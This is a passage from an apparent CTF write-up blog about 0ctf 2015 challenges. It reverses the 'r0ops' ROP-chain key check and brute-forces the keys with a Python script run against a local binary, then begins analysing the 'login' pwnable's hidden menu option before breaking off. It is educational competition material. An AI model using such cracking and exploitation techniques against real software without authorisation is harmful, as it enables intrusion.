</span><span class='line'>
</span><span class='line'>Breakpoint 2, 0x000000000dead1ae in ?? <span class="o">()</span>
</span><span class='line'>1: x/i <span class="nv">$rip</span>
</span><span class='line'><span class="o">=</span>&gt; 0xdead1ae:   cmp    rax,rbx
</span></code></pre></td></tr></table></div></figure>


<p>This allowed me to dump each value that was generated, and finally see which values are being compared by the binary (one of which was the magic constant).</p>

<p>I briefly considered bruteforcing the entire 64-bit range, but this was <em>way</em> too slow, even in C. I focussed on creating a function that emulates what is done with the first QWORD. After squashing a bug, I ended up with the following python code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">n</span><span class="p">):</span>
</span><span class='line'>  <span class="k">while</span> <span class="n">n</span><span class="p">:</span>
</span><span class='line'>      <span class="n">x</span> <span class="o">=</span> <span class="p">(</span><span class="n">x</span><span class="o">*</span><span class="n">x</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffffffffffff</span>
</span><span class='line'>      <span class="n">n</span> <span class="o">-=</span> <span class="mi">1</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">x</span>
</span><span class='line'>  
</span><span class='line'><span class="k">def</span> <span class="nf">c</span><span class="p">(</span><span class="n">i</span><span class="p">):</span>
</span><span class='line'>  <span class="n">x</span> <span class="o">=</span> <span class="p">(</span><span class="n">p</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span> <span class="o">*</span> <span class="n">i</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffffffffffff</span>
</span><span class='line'>  <span class="n">x</span> <span class="o">=</span> <span class="p">(</span><span class="n">p</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span> <span class="o">*</span> <span class="n">x</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffffffffffff</span>
</span><span class='line'>  <span class="n">x</span> <span class="o">=</span> <span class="p">(</span><span class="n">p</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="mi">10</span><span class="p">)</span> <span class="o">*</span> <span class="n">x</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffffffffffff</span>
</span><span class='line'>  <span class="n">x</span> <span class="o">=</span> <span class="p">(</span><span class="n">p</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="mi">12</span><span class="p">)</span> <span class="o">*</span> <span class="n">x</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffffffffffff</span>
</span><span class='line'>  <span class="k">return</span> <span class="p">(</span><span class="n">p</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="mi">13</span><span class="p">)</span> <span class="o">*</span> <span class="n">x</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffffffffffff</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">c</span><span class="p">(</span><span class="mh">0x4242424241414141</span><span class="p">))</span> <span class="c"># remember, little endian ;)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Then I noticed something crucial. As I entered variations of <code>0x4242424241414141</code>, the last byte of the generated value was only dependent on the last byte of the input (by chance it was also <code>0x41</code>)! This gave me an idea&hellip;</p>

<h2>Byte-by-byte</h2>

<p>I found I could bruteforce the correct value for each QWORD, going one byte at a time! After a while (and squashing the aforementioned bug by careful tracing of the ROP chain) I came up with the following python code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">q</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;Q&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">n</span><span class="p">):</span>
</span><span class='line'>  <span class="k">while</span> <span class="n">n</span><span class="p">:</span>
</span><span class='line'>      <span class="n">x</span> <span class="o">=</span> <span class="p">(</span><span class="n">x</span><span class="o">*</span><span class="n">x</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffffffffffff</span>
</span><span class='line'>      <span class="n">n</span> <span class="o">-=</span> <span class="mi">1</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">x</span>
</span><span class='line'>  
</span><span class='line'><span class="k">def</span> <span class="nf">c</span><span class="p">(</span><span class="n">i</span><span class="p">):</span>
</span><span class='line'>  <span class="n">x</span> <span class="o">=</span> <span class="p">(</span><span class="n">p</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span> <span class="o">*</span> <span class="n">i</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffffffffffff</span>
</span><span class='line'>  <span class="n">x</span> <span class="o">=</span> <span class="p">(</span><span class="n">p</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span> <span class="o">*</span> <span class="n">x</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffffffffffff</span>
</span><span class='line'>  <span class="n">x</span> <span class="o">=</span> <span class="p">(</span><span class="n">p</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="mi">10</span><span class="p">)</span> <span class="o">*</span> <span class="n">x</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffffffffffff</span>
</span><span class='line'>  <span class="n">x</span> <span class="o">=</span> <span class="p">(</span><span class="n">p</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="mi">12</span><span class="p">)</span> <span class="o">*</span> <span class="n">x</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffffffffffff</span>
</span><span class='line'>  <span class="k">return</span> <span class="p">(</span><span class="n">p</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="mi">13</span><span class="p">)</span> <span class="o">*</span> <span class="n">x</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffffffffffff</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="n">key_list</span> <span class="o">=</span> <span class="p">[]</span>
</span><span class='line'><span class="n">check</span> <span class="o">=</span> <span class="mh">0x1337deadbeef0095</span>
</span><span class='line'><span class="k">for</span> <span class="n">u</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
</span><span class='line'>  <span class="n">check</span> <span class="o">=</span> <span class="p">((</span><span class="n">check</span> <span class="o">*</span> <span class="mh">0xcafe</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0xbeef</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffffffffffff</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">key</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
</span><span class='line'>      <span class="k">for</span> <span class="n">z</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mh">0xff</span><span class="p">):</span>
</span><span class='line'>          <span class="c"># ugly, but works: it basically only compares the output of the c() function</span>
</span><span class='line'>          <span class="c"># up to the byte it&#39;s bruteforcing</span>
</span><span class='line'>          <span class="k">if</span> <span class="p">(</span><span class="n">c</span><span class="p">(</span><span class="n">key</span> <span class="o">|</span> <span class="p">(</span><span class="n">z</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="n">i</span><span class="o">*</span><span class="mi">8</span><span class="p">)))</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mh">0xff</span> <span class="o">&lt;&lt;</span> <span class="n">i</span><span class="o">*</span><span class="mi">8</span><span class="p">))</span> <span class="o">==</span> <span class="p">(</span><span class="n">check</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mh">0xff</span> <span class="o">&lt;&lt;</span> <span class="n">i</span><span class="o">*</span><span class="mi">8</span><span class="p">)):</span>
</span><span class='line'>              <span class="n">key</span> <span class="o">+=</span> <span class="p">(</span><span class="n">z</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="n">i</span> <span class="o">*</span> <span class="mi">8</span><span class="p">))</span>
</span><span class='line'>              <span class="k">break</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">print</span> <span class="s">&quot;[+] key {}: {} -&gt; {} == {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">u</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">key</span><span class="p">),</span> <span class="nb">hex</span><span class="p">(</span><span class="n">c</span><span class="p">(</span><span class="n">key</span><span class="p">)),</span> <span class="nb">hex</span><span class="p">(</span><span class="n">check</span><span class="p">))</span>
</span><span class='line'>  <span class="n">key_list</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'><span class="c"># send all the generated keys as little-endian QWORDS to the binary</span>
</span><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'><span class="k">global</span> <span class="n">s</span>
</span><span class='line'><span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;localhost&#39;</span><span class="p">,</span> <span class="mi">13337</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
</span><span class='line'><span class="k">for</span> <span class="n">key</span> <span class="ow">in</span> <span class="n">key_list</span><span class="p">:</span>
</span><span class='line'>  <span class="n">payload</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="o">+</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1000</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>The ROP chain went through its hoops and landed here, dumping the flag!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="mo">000000000</span><span class="n">dead1aa</span>    <span class="mh">0xdead1ae</span><span class="p">:</span>   <span class="nb">cmp</span>    <span class="n">rax</span><span class="p">,</span><span class="n">rbx</span>
</span><span class='line'>                    <span class="mh">0xdead1b1</span><span class="p">:</span> <span class="n">je</span>     <span class="mh">0xdead1b6</span>  <span class="p">;</span> <span class="k">if</span> <span class="n">rax</span> <span class="o">==</span> <span class="n">rbx</span><span class="p">,</span> <span class="n">the</span> <span class="n">special</span> <span class="n">constant</span> <span class="ow">and</span> <span class="n">the</span> <span class="n">value</span> <span class="n">generated</span> <span class="kn">from</span> <span class="nn">our</span> <span class="nn">QWORD</span> <span class="nn">match</span>
</span><span class='line'>                    <span class="mh">0xdead1b3</span><span class="p">:</span> <span class="n">add</span>    <span class="n">rsp</span><span class="p">,</span><span class="n">rdx</span>    <span class="p">;</span> <span class="k">if</span> <span class="n">rax</span> <span class="o">==</span> <span class="n">rbx</span><span class="p">,</span> <span class="n">this</span> <span class="ow">is</span> <span class="n">skipped</span><span class="o">...</span>
</span><span class='line'>                      <span class="mh">0xdead1b6</span><span class="p">:</span>   <span class="n">ret</span>               <span class="p">;</span>
</span><span class='line'><span class="mo">000000000</span><span class="n">dead1fc</span>   <span class="n">pop</span>    <span class="n">rdx</span>                    <span class="p">;</span> <span class="o">...</span><span class="ow">and</span> <span class="n">the</span> <span class="n">ROP</span> <span class="n">chain</span> <span class="n">continues</span> <span class="n">here</span><span class="o">...</span>
</span><span class='line'><span class="n">fffffffffffffc38</span>
</span><span class='line'><span class="mo">000000000</span><span class="n">dead1d7</span>   <span class="n">loop</span>   <span class="mh">0xdead1db</span>              <span class="p">;</span> <span class="o">...</span><span class="k">if</span> <span class="nb">all</span> <span class="n">eight</span> <span class="n">QWORDS</span> <span class="n">check</span> <span class="n">out</span><span class="o">...</span> <span class="p">(</span><span class="n">rcx</span> <span class="n">contained</span> <span class="mi">8</span> <span class="n">at</span> <span class="n">the</span> <span class="n">start</span><span class="p">)</span>
</span><span class='line'><span class="mo">000000000</span><span class="n">dead33c</span>
</span><span class='line'>   <span class="mh">0xdead340</span><span class="p">:</span>  <span class="n">sub</span>    <span class="n">rsp</span><span class="p">,</span><span class="mh">0x10</span>                   <span class="p">;</span> <span class="o">...</span><span class="n">then</span> <span class="n">control</span> <span class="ow">is</span> <span class="n">passed</span> <span class="n">here</span>
</span><span class='line'>   <span class="mh">0xdead344</span><span class="p">:</span>  <span class="n">mov</span>    <span class="n">edi</span><span class="p">,</span><span class="mh">0xdead544</span>
</span><span class='line'>   <span class="mh">0xdead349</span><span class="p">:</span>  <span class="n">call</span>   <span class="mh">0x400680</span> <span class="o">&lt;</span><span class="n">puts</span><span class="nd">@plt</span><span class="o">&gt;</span>
</span><span class='line'>   <span class="mh">0xdead34e</span><span class="p">:</span>  <span class="n">mov</span>    <span class="n">edi</span><span class="p">,</span><span class="mh">0xdead54e</span>
</span><span class='line'>   <span class="mh">0xdead353</span><span class="p">:</span>  <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x0</span>
</span><span class='line'>   <span class="mh">0xdead358</span><span class="p">:</span>  <span class="n">call</span>   <span class="mh">0x4006a0</span> <span class="o">&lt;</span><span class="n">printf</span><span class="nd">@plt</span><span class="o">&gt;</span>
</span><span class='line'>   <span class="mh">0xdead35d</span><span class="p">:</span>  <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x4</span><span class="p">],</span><span class="mh">0x0</span>
</span><span class='line'>   <span class="mh">0xdead364</span><span class="p">:</span>  <span class="n">jmp</span>    <span class="mh">0xdead38b</span>
</span><span class='line'>   <span class="mh">0xdead366</span><span class="p">:</span>  <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x4</span><span class="p">]</span>
</span><span class='line'>   <span class="mh">0xdead369</span><span class="p">:</span>  <span class="n">cdqe</span>
</span><span class='line'>   <span class="mh">0xdead36b</span><span class="p">:</span>  <span class="n">mov</span>    <span class="n">rax</span><span class="p">,</span><span class="n">QWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rax</span><span class="o">*</span><span class="mi">8</span><span class="o">+</span><span class="mh">0xe0b10c0</span><span class="p">]</span>
</span><span class='line'>   <span class="mh">0xdead373</span><span class="p">:</span>  <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">eax</span>
</span><span class='line'>   <span class="mh">0xdead375</span><span class="p">:</span>  <span class="n">mov</span>    <span class="n">rsi</span><span class="p">,</span><span class="n">rax</span>
</span><span class='line'>   <span class="mh">0xdead378</span><span class="p">:</span>  <span class="n">mov</span>    <span class="n">edi</span><span class="p">,</span><span class="mh">0xdead55d</span>
</span><span class='line'>   <span class="mh">0xdead37d</span><span class="p">:</span>  <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x0</span>
</span><span class='line'>   <span class="mh">0xdead382</span><span class="p">:</span>  <span class="n">call</span>   <span class="mh">0x4006a0</span> <span class="o">&lt;</span><span class="n">printf</span><span class="nd">@plt</span><span class="o">&gt;</span>
</span><span class='line'>   <span class="mh">0xdead387</span><span class="p">:</span>  <span class="n">add</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x4</span><span class="p">],</span><span class="mh">0x1</span>
</span><span class='line'>   <span class="mh">0xdead38b</span><span class="p">:</span>  <span class="nb">cmp</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x4</span><span class="p">],</span><span class="mh">0x7</span>
</span><span class='line'>   <span class="mh">0xdead38f</span><span class="p">:</span>  <span class="n">jle</span>    <span class="mh">0xdead366</span>
</span><span class='line'>   <span class="mh">0xdead391</span><span class="p">:</span>  <span class="n">mov</span>    <span class="n">edi</span><span class="p">,</span><span class="mh">0xdead564</span>
</span><span class='line'>   <span class="mh">0xdead396</span><span class="p">:</span>  <span class="n">call</span>   <span class="mh">0x400680</span> <span class="o">&lt;</span><span class="n">puts</span><span class="nd">@plt</span><span class="o">&gt;</span>            <span class="p">;</span> <span class="n">dumps</span> <span class="n">flag</span> <span class="ow">in</span> <span class="n">console</span><span class="err">!</span>
</span><span class='line'>   <span class="mh">0xdead39b</span><span class="p">:</span>  <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x0</span>
</span><span class='line'>   <span class="mh">0xdead3a0</span><span class="p">:</span>  <span class="n">call</span>   <span class="mh">0xdead3af</span>
</span><span class='line'>   <span class="mh">0xdead3a5</span><span class="p">:</span>  <span class="n">leave</span>
</span><span class='line'>   <span class="mh">0xdead3a6</span><span class="p">:</span>  <span class="n">ret</span>
</span></code></pre></td></tr></table></div></figure>


<p>The output of the script and binary:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/0ctf/r0ops<span class="nv">$ </span>./r0ops <span class="p">&amp;</span> python ./bf.py
</span><span class='line'><span class="o">[</span>1<span class="o">]</span> 4471
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> key 0: 0xd5b028b6c97155a5L -&gt; <span class="nv">0x2724090c0798e4c5L</span> <span class="o">==</span> 0x2724090c0798e4c5L
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> key 1: 0x51a2c3e8e288fa45 -&gt; <span class="nv">0x44e477ee2e372c65L</span> <span class="o">==</span> 0x44e477ee2e372c65L
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> key 2: 0x561720a3f926b105 -&gt; <span class="nv">0xa150eec963c67d25L</span> <span class="o">==</span> 0xa150eec963c67d25L
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> key 3: 0xa325ec548e4e0385L -&gt; <span class="nv">0xeab7d48b9db01ba5L</span> <span class="o">==</span> 0xeab7d48b9db01ba5L
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> key 4: 0x5369761ad6ccde85 -&gt; <span class="nv">0xf01b0cf36a8c5ea5L</span> <span class="o">==</span> 0xf01b0cf36a8c5ea5L
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> key 5: 0x9475802813002885L -&gt; <span class="nv">0x930eeb9679f4d8a5L</span> <span class="o">==</span> 0x930eeb9679f4d8a5L
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> key 6: 0xcadd6a0bdc679485L -&gt; <span class="nv">0xaeb27b8833e1e4a5L</span> <span class="o">==</span> 0xaeb27b8833e1e4a5L
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> key 7: 0x7d67b37124bcbc85 -&gt; <span class="nv">0x2a900a13b88bcca5L</span> <span class="o">==</span> 0x2a900a13b88bcca5L
</span><span class='line'>
</span><span class='line'>YOU WIN!
</span><span class='line'>
</span><span class='line'>FLAG IS: 0ctf<span class="o">{</span>c97155a5e288fa45f926b1058e4e0385d6ccde8513002885dc67948524bcbc85<span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Good stuff! Funny to see a ROP chain &ldquo;from the other side&rdquo; :)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[0ctf - Login]]></title>
    <link href="http://barrebas.github.io/blog/2015/03/30/0ctf-login/"/>
    <updated>2015-03-30T20:17:23+02:00</updated>
    <id>http://barrebas.github.io/blog/2015/03/30/0ctf-login</id>
    <content type="html"><![CDATA[<p>The second pwnable I solved for <code>0ctf</code> on behalf of CTF-Team VulnHub! This one contained My Favorite Vulnerability, guess which one?</p>

<!-- more -->


<p><code>login</code> was a 64-bit ELF. Quickly checking what I was up against with <code>gdb-peda</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>checksec
</span><span class='line'>CANARY    : ENABLED
</span><span class='line'>FORTIFY   : disabled
</span><span class='line'>NX        : ENABLED
</span><span class='line'>PIE       : ENABLED
</span><span class='line'>RELRO     : FULL
</span></code></pre></td></tr></table></div></figure>


<p>Oops. This looks like fun! The description said to login as guest, and login as root. Together with the output of <code>strings</code>, this allowed me to bypass the first login:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Login: guest
</span><span class='line'>Password: <span class="nv">guest123</span>
</span><span class='line'><span class="o">==</span> 0CTF Login <span class="nv">System</span> <span class="o">==</span>
</span><span class='line'>1. Show Profile
</span><span class='line'>2. Login as User
</span><span class='line'>3. <span class="nv">Logout</span>
</span><span class='line'><span class="o">=======================</span>
</span><span class='line'>Your choice: 1
</span><span class='line'>Username: guest
</span><span class='line'>Level: Guest
</span></code></pre></td></tr></table></div></figure>


<p>Now, we&rsquo;re presented with three choices. With <code>2</code>, we can change our username and view it with <code>1</code>. However, this was not vulnerable to overflows or format string vulnerabilities. I dug into the menu system, looking for hidden things, and indeed:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="p">;;;</span> print_menu and get_choice
</span><span class='line'>1265: call   ddd &lt;open@plt+0x24d&gt;   
</span><span class='line'>126a: mov    DWORD PTR <span class="o">[</span>rbp-0x4<span class="o">]</span>,eax
</span><span class='line'>126d: mov    eax,DWORD PTR <span class="o">[</span>rbp-0x4<span class="o">]</span>
</span><span class='line'>1270: cmp    eax,0x2
</span><span class='line'>1273: je     <span class="m">1299</span> &lt;open@plt+0x709&gt;
</span><span class='line'>1275: cmp    eax,0x2
</span><span class='line'>1278: jg     <span class="m">1281</span> &lt;open@plt+0x6f1&gt;
</span><span class='line'>127a: cmp    eax,0x1
</span><span class='line'>127d: je     128d &lt;open@plt+0x6fd&gt;
</span><span class='line'>127f: jmp    12e3 &lt;open@plt+0x753&gt;
</span><span class='line'>1281: cmp    eax,0x3
</span><span class='line'>1284: je     12a5 &lt;open@plt+0x715&gt;
</span><span class='line'>1286: cmp    eax,0x4                <span class="p">;</span> AHA! Secret entry
</span><span class='line'>1289: je     12b8 &lt;open@plt+0x728&gt;  <span class="p">;</span> Jump to 12b8
</span><span class='line'>128b: jmp    12e3 &lt;open@plt+0x753&gt;
</span><span class='line'>128d: mov    eax,0x0
</span><span class='line'>1292: call   f24 &lt;open@plt+0x394&gt;
</span><span class='line'>1297: jmp    12f0 &lt;open@plt+0x760&gt;
</span><span class='line'>1299: mov    eax,0x0
</span><span class='line'>129e: call   f7a &lt;open@plt+0x3ea&gt;
</span><span class='line'>12a3: jmp    12f0 &lt;open@plt+0x760&gt;
</span><span class='line'>12a5: lea    rdi,<span class="o">[</span>rip+0x246<span class="o">]</span>        <span class="c"># 14f2 &lt;open@plt+0x962&gt;</span>
</span><span class='line'>12ac: call   a90 &lt;puts@plt&gt;
</span><span class='line'>12b1: mov    eax,0x0
</span><span class='line'>12b6: jmp    12f5 &lt;open@plt+0x765&gt;
</span><span class='line'>
</span><span class='line'><span class="p">;;;</span> choice 4
</span><span class='line'>12b8: lea    rax,<span class="o">[</span>rip+0x200d81<span class="o">]</span>     <span class="p">;</span> rax points to our provided username <span class="o">(</span>e.g. <span class="s1">&#39;root&#39;</span><span class="o">)</span>
</span><span class='line'>12bf: mov    eax,DWORD PTR <span class="o">[</span>rax+0x100<span class="o">]</span>  <span class="p">;</span> check this flag... starts off as 0x1
</span><span class='line'>12c5: <span class="nb">test   </span>eax,eax
</span><span class='line'>12c7: jne    12d5 &lt;open@plt+0x745&gt;
</span></code></pre></td></tr></table></div></figure>


